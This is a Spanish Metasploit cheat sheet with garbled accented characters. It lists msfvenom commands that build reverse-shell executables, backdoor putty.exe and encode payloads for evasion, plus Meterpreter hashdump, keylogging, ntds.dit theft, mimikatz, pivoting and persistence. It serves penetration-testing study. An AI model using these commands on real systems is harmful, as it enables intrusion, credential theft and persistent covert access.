# Metasploit Framework

> [!info] Herramienta
> Framework de explotaciÃ³n mÃ¡s completo: exploits, payloads, Meterpreter, post-explotaciÃ³n y evasiÃ³n.

> â†’
## Inicio y Consola

> [!tip] msfconsole
> La interfaz principal de Metasploit.

```bash

# Iniciar consola
msfconsole

# Sin banner
msfconsole -q

# Ejecutar resource script
msfconsole -r setup.rc

# Inicializar base de datos
msfdb init
msfdb status

# Verificar conexiÃ³n DB
db_status

# Ayuda
help
?

# Salir
exit
| ```
## BÃºsqueda de MÃ³dulos

> [!important] Encontrar exploits
> Buscar por nombre, CVE, plataforma o tipo.

```bash

# BÃºsqueda bÃ¡sica
search eternalblue

# Filtrar por tipo y plataforma
search type:exploit platform:windows

# Por nombre
search name:smb

# Por CVE
search cve:2021

# Auxiliares
search type:auxiliary

# Info de mÃ³dulo
info exploit/windows/smb/ms17_010_eternalblue
```

### Filtros de BÃºsqueda

| Filtro | DescripciÃ³n |
|--------|-------------|
| `type:` | exploit, auxiliary, payload, post, encoder |
| `platform:` | windows, linux, android, osx |
| `name:` | Nombre del mÃ³dulo |
| `port:` | Puerto |
| `rank:` | great, good, normal |
| `date:` | Rango de fechas |
| | `author:` | Autor |
|----------------------------------|------------------------|
## Workspaces

> [!note] OrganizaciÃ³n
> Separar proyectos/engagements.

```bash

# Listar workspaces
workspace

# Crear workspace
workspace -a cliente_a

# Cambiar workspace
workspace cliente_a

# Renombrar
workspace -r temp production

# Eliminar
workspace -d cliente_a

# Eliminar todos
workspace -D
```

---

## Exploits â€” SelecciÃ³n

| Comando | DescripciÃ³n |
|---------|-------------|
| `use <mÃ³dulo>` | Cargar mÃ³dulo |
| `use <nÃºmero>` | Cargar por Ã­ndice de search |
| `back` | Salir del mÃ³dulo |
| `show targets` | Objetivos compatibles |
| `run` / `exploit` | Ejecutar |
| `recheck` | Re-verificar vulnerabilidad |

```bash
# Cargar exploit
use exploit/windows/smb/ms17_010_eternalblue

# O por nÃºmero
search eternalblue
use 0

# Ejecutar
exploit

# Ejecutar como job en background
exploit -j
| ```
## Exploits â€” Opciones

> [!warning] ConfiguraciÃ³n
> Configurar opciones antes de ejecutar.

| Comando | DescripciÃ³n |

| `show options` | Ver opciones del mÃ³dulo |
| `set <OPCIÃ“N> <valor>` | Configurar opciÃ³n |
| `setg <OPCIÃ“N> <valor>` | Configurar global |
| `unset <OPCIÃ“N>` | Limpiar opciÃ³n |
| `unsetg <OPCIÃ“N>` | Limpiar global |
| `set PAYLOAD <payload>` | Seleccionar payload |

```bash
# Ver opciones
show options

# Configurar target
set RHOSTS 192.168.1.100
set RPORT 445

# Configurar listener
set LHOST 192.168.1.50
set LPORT 4444

# Configurar payload
set PAYLOAD windows/x64/meterpreter/reverse_tcp

# OpciÃ³n global
setg LHOST 192.168.1.50
| ```
## MÃ³dulos Auxiliares

> [!note] Escaneo y enumeraciÃ³n
> No explotan, pero sirven para reconocimiento.

```bash

# Port scan
use auxiliary/scanner/portscan/tcp
set RHOSTS 192.168.1.0/24
set PORTS 1-1000
run

# Directorios web
use auxiliary/scanner/http/dir_scanner
set RHOSTS target
set THREADS 10
run

# SMB login brute
use auxiliary/scanner/smb/smb_login
set USER_FILE users.txt
set PASS_FILE pass.txt
run

# SSH login brute
use auxiliary/scanner/ssh/ssh_login
set RHOSTS target
set STOP_ON_SUCCESS true
run
```

---

## Payloads

> [!important] Tipos
| Tipo | DescripciÃ³n |
|------|-------------|
| `reverse_tcp` | ConexiÃ³n de vuelta al atacante (requiere LHOST/LPORT) |
| `bind_tcp` | Abre puerto en target (requiere RHOST/RPORT) |
| `meterpreter` | Shell avanzada in-memory |
| `shell` | Shell bÃ¡sica del sistema |

### Staged vs Stageless

| Tipo | Ejemplo | DescripciÃ³n |
|------|---------|-------------|
| Staged | `reverse_tcp` (con `/`) | EnvÃ­a stager mÃ­nimo, descarga payload completo |
| Stageless | `reverse_tcp` (con `_`) | Payload completo en un solo binario |

```bash
# Listar payloads compatibles
show payloads

# Seleccionar
set PAYLOAD windows/x64/meterpreter/reverse_tcp
| ```
## msfvenom â€” GeneraciÃ³n de Payloads

> [!danger] Generar payloads
> Fuera de msfconsole, pero la sesiÃ³n se recibe en msfconsole.

```bash

# Generar ejecutable
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.1.50 LPORT=4444 -f exe -o payload.exe

# Listar formatos
msfvenom -l formats

# Listar payloads
msfvenom -l payloads

# Con encoding
msfvenom -p ... -e x86/shikata_ga_nai -i 5

# Inyectar en binario legÃ­timo
msfvenom -p ... -x putty.exe -k -f exe -o payload.exe
| ```
## Meterpreter â€” Comandos BÃ¡sicos

> [!tip] Shell avanzada
> In-memory, no escribe en disco.

| Comando | DescripciÃ³n |

| `help` | Mostrar comandos |
| `sysinfo` | Info del sistema |
| `getuid` | Usuario actual |
| `getsystem` | Escalar a SYSTEM |
| `background` / `bg` | EnvÃ­a a segundo plano |
| `shell` | Shell del sistema |

```bash
# Info del sistema
sysinfo

# Usuario actual
getuid

# Escalar privilegios
getsystem

# Shell del sistema
shell
exit # vuelve a meterpreter
```

---

## Meterpreter â€” Archivos

| Comando | DescripciÃ³n |
|---------|-------------|
| `ls` / `pwd` / `cd` | NavegaciÃ³n |
| `upload <local> <remoto>` | Subir archivo |
| `download <remoto> <local>` | Descargar archivo |
| `search -f <patrÃ³n>` | Buscar archivos |
| `cat <archivo>` | Ver contenido |
| `rm` / `mkdir` / `edit` | Gestionar archivos |

```bash
# Subir herramienta
upload /tmp/mimikatz.exe C:\Windows\Temp\

# Descargar hash
download C:\Windows\NTDS\ntds.dit /tmp/

# Buscar archivos
search -f *.txt
search -f password*
```

---

## Meterpreter â€” Sistema

| Comando | DescripciÃ³n |
|---------|-------------|
| `ps` | Listar procesos |
| `migrate <PID>` | Migrar a proceso |
| `hashdump` | Extraer hashes NTLM |
| `keyscan_start` | Iniciar keylogger |
| `keyscan_dump` | Ver teclas capturadas |
| `screenshot` | Capturar pantalla |

```bash
# Listar procesos
ps

# Migrar a explorer.exe
migrate 1234

# Extraer hashes
hashdump

# Keylogger
keyscan_start
keyscan_dump
keyscan_stop
```

---

## Meterpreter â€” Red

| Comando | DescripciÃ³n |
|---------|-------------|
| `ipconfig` / `ifconfig` | Interfaces de red |
| `portfwd add -l <local> -p <remoto> -r <target>` | Port forwarding |
| `route add <subred> <mÃ¡scara> <sesiÃ³n>` | Ruta para pivoting || `autoroute -s <subred>` | Auto-ruta |
| `arp` / `netstat` | Tabla ARP/conexiones |

```bash
# Port forwarding (acceso a RDP interno)
portfwd add -l 3389 -p 3389 -r 192.168.1.100

# Pivoting
route add 192.168.2.0 255.255.255.0 1
autoroute -s 192.168.1.0/24
```

---

## Base de Datos

| Comando | DescripciÃ³n |
|---------|-------------|
| `db_nmap <opciones> <target>` | Nmap con guardado automÃ¡tico |
| `hosts` | Hosts descubiertos |
| `services` | Servicios descubiertos |
| `vulns` | Vulnerabilidades |
| `notes` | Notas |
| `creds` | Credenciales |

```bash
# Escaneo con guardado
db_nmap -sV -O 192.168.1.0/24

# Ver hosts
hosts

# Ver servicios
services -p 445
```

---

## EvasiÃ³n

| Comando | DescripciÃ³n |
|---------|-------------|
| `show encoders` | Listar encoders |
| `set EnableStageEncoding true` | Encoding automÃ¡tico |
| `set EXITFUNC thread` | Salida segura |

```bash
# Con encoding
msfvenom -p ... -e x64/xor -i 3

# Encoding de stager
set EnableStageEncoding true
set StageEncoder x64/xor
```

---

## Post-ExplotaciÃ³n

```bash
# Detectar VM
run post/windows/gather/checkvm

# Enumerar usuarios logueados
run post/windows/gather/enum_logged_on_users

# Sugerir exploits locales
run post/multi/recon/local_exploit_suggester

# Habilitar RDP
run post/windows/manage/enable_rdp

# Cargar Kiwi (Mimikatz)
load kiwi
creds_all
kerberos_ticket_list

# Persistencia
run post/windows/manage/persistence_exe
```

---

#checklist
- [ ] msfconsole iniciado y DB conectada
- [ ] MÃ³dulos buscados con `search`
- [ ] Exploit configurado con `set RHOSTS/RPORT/LHOST/LPORT`
- [ ] Payload seleccionado y compatible
- [ ] msfvenom para generar payloads standalone
- [ ] Meterpreter: sysinfo, getuid, hashdump
- [ ] Pivoting con autoroute y portfwd
- [ ] Post-explotaciÃ³n con mÃ³dulos post/

â†’

